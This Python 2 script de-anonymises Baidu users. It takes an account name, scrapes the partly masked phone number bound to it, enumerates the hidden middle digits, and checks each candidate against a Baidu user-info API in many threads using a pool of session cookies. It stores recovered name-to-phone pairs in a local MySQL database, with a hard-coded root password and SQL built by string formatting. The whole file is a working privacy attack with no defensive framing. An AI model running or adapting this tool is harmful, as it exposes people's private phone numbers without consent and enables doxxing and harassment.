# -*- coding: utf-8 -*-
import re
import time
import json
import MySQLdb
import requests
import threading
from urllib import quote,unquote
import Get_Name_By_Phone as get_name
import random


start_time = time.time()


def get_userid(name):
    get_id_url = 'http://tieba.baidu.com/home/main?un=%s&ie=utf-8&fr=pb' % (name)
    id_request = requests.get(get_id_url)
    id_pattern = re.compile(r'"user_id":(\d+),"homeUserName":')
    id = id_pattern.search(id_request.content).group(1)
    return id


def get_numbers(ppid):
    headers = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate, sdch',
        'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6',
        'Cache-Control':'max-age=0',
        'Connection':'keep-alive',
        'Cookie':'BAIDUID=8688C81A7043FD661AB825FB3AF8649E:FG=1;',
        'DNT':'1',
        'Host':'koubei.baidu.com',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'
    }
    get_number_url = 'http://koubei.baidu.com/home?fr=header&ppid=%s' % (ppid)
    numbers_request = requests.get(get_number_url, headers=headers)
    numbers_pattern = re.compile(r'"securemobil":"(.{11})",')
    try:
        numbers = numbers_pattern.search(numbers_request.content).group(1)
    except:
        raise Exception('未绑定手机')
    return numbers


def get_mid(head, city):
    url = 'http://www.chahaoba.com/%s%s' % (city, head)
    respond = requests.get(url).content
    pattern_str = '">%s(\d{4})</a></li>' % head
    numbers_pattern = re.compile(pattern_str)
    mid_list = numbers_pattern.findall(respond)
    if city == '':
        mid_list = get_all_numbers()
        return mid_list
    return list(set(mid_list))


def get_all_numbers():
    all_numbers = []
    for i in range(10):
        all_numbers.append('000%d' % i)
    for i in  range(10, 100):
        all_numbers.append('00%d' % i)
    for i in range(100, 1000):
        all_numbers.append('0%d' % i)
    for i in range(1000,10000):
        all_numbers.append('%d' % i)
    return all_numbers


def get_info_by_id(uid, cookies, count):
    url = 'http://yun.baidu.com/api/user/getinfo?user_list=%%5B%%22%s%%22%%5D&need_relation=1' % uid
    info_request = requests.get(url, cookies=cookies[count])
    return info_request.content


def get_exact_phone_thread(head, mid, tail, cookies, phone_name_dist, alive, threads_list):
    try:
        del threads_list[0]
        count = random.randint(1000, 10000)
        for i in range(10):
                phone_tmp = '%s%s%s%s' % (head, mid, i, tail)
                while True:
                    uid_tmp, name_tmp, count = get_name.get_info(phone_tmp, cookies, count)
                    if uid_tmp != '-1' and name_tmp != '-1':
                        break
                if uid_tmp:
                    if name_tmp is None:
                        info = get_info_by_id(uid_tmp, cookies, count)
                        info_json = json.loads(info)
                        name = info_json['records'][0]['uname']
                    else:
                        name = name_tmp
                    phone_name_dist[name] = phone_tmp
        del alive[0]
    except:
        del alive[0]


def get_exact_phone(name, city, cookies, threads_numbers):
    phone_name_dist = {}
    threads_list = []
    alive_list = []
    threads_count = 0
    try:
        uid = get_userid(name)
    except:
        raise Exception('账号不存在')
    try:
        phone_with_mosaic = get_numbers(uid)
    except:
        raise Exception('未绑定手机')
    print '%s\n' % phone_with_mosaic
    head = phone_with_mosaic[:3]
    tail = phone_with_mosaic[-3:]
    phone_mid_list = get_mid(head, city)
    for mid in phone_mid_list:
        tmp = threading.Thread(target=get_exact_phone_thread, args=(head, mid, tail, cookies, phone_name_dist, alive_list, threads_list))
        threads_list.append(tmp)
    threads_list_bak = threads_list[:]
    count = 0
    end_time = time.time() + 99999
    while True:
        if len(alive_list) <= threads_numbers and threads_count < len(threads_list_bak):
            alive_list.append(threads_list_bak[threads_count])
            threads_list_bak[threads_count].setDaemon(True)
            threads_list_bak[threads_count].start()
            threads_count += 1
        if len(threads_list) == 0 and count == 0:
            print 'Finished'
            end_time = time.time()
            count += 1
        if time.time()-end_time >= 10:
            alive_list = []
        if len(alive_list) == 0:
            break
    return phone_name_dist


def print_phone(name, city, cookies, threads_numbers = 45):
    try:
        name_dist = get_exact_phone(name, city, cookies, threads_numbers)
    except:
        return '账号不存在或未绑定手机'
    try:
        conn = MySQLdb.connect(host='localhost', user='root', passwd='0010', db='baidu_info', port=3306)
        cur = conn.cursor()
        for key, value in name_dist.items():
            cur.execute('insert ignore into info (id, phone) values ("%s", "%s")' % (quote(key.encode('utf-8')), value))
        conn.commit()
        cur.close()
        conn.close()
    except MySQLdb.Error, e:
        print "Mysql Error %d: %s" % (e.args[0], e.args[1])
    try:
        print unquote(name)
        print name_dist[unquote(name)]
        return 'id:%s phone:%s' % (unquote(name), name_dist[unquote(name)])
    except Exception, e:
        if city == '' and unquote(name) not in name_dist.keys():
            conn = MySQLdb.connect(host='localhost', user='root', passwd='0010', db='baidu_info', port=3306)
            cur = conn.cursor()
            cur.execute('insert ignore into info (id, phone) values ("%s", "null")' % quote(name.encode('utf-8')))
            conn.commit()
            cur.close()
            conn.close()
	return u'找不到 %s 的手机号码,可能是由于您提供的位置不正确' % name
